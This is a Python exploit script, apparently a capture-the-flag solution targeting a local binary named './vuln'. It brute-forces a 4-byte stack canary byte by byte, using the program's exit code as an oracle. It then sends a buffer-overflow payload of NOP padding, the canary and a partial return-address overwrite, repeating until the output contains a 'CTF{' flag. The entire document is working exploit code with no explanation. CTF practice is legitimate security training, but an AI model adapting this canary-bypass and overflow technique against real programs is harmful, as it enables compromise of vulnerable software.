#!/usr/bin/env python3
import struct
import subprocess
import sys
from subprocess import DEVNULL, PIPE


VERBOSE = 1


def trace(*args, **kwargs):
    if VERBOSE > 1: print(*args, file=sys.stderr, flush=True, **kwargs)


def brute(fn):
    def oracle(canary, fn):
        payl = pad(32) + canary
        pwn = '{}\n'.format(len(payl)).encode('ascii') + payl
        proc = subprocess.run([fn], input=pwn, stdout=DEVNULL, stderr=DEVNULL)
        return proc.returncode != 255

    canary = b''
    while len(canary) < 4:
        trace('canary: ', canary)
        for x in range(256):
            q = canary + bytes([x])
            trace('  ', q)
            if oracle(q, fn):
                canary = q
                break
        else:
            raise Exception('poop')
    return canary


def pad(n, c=b'\x90'): return c*n
def i32(x, n=1): return struct.pack('<I', x)*n
def i64(n): return struct.pack('<Q', n)


def solve(fn='./vuln'):
    canary = brute(fn)

    # payl = pad(32) + canary + i32(0, 4) + b'\xed\x57' # i32(0x565557ed)
    # pwn = '{}\n'.format(len(payl)).encode('ascii') + payl
    # sys.stdout.buffer.write(pwn)
    # return

    while True:
        payl = pad(32) + canary + i32(0, 4) + b'\xed\x57' # i32(0x565557ed)
        pwn = '{}\n'.format(len(payl)).encode('ascii') + payl
        proc = subprocess.run([fn], input=pwn, stdout=PIPE, stderr=PIPE)
        if b'CTF{' in proc.stdout:
            print(proc)
            return


if __name__ == '__main__':
    solve(*sys.argv[1:])
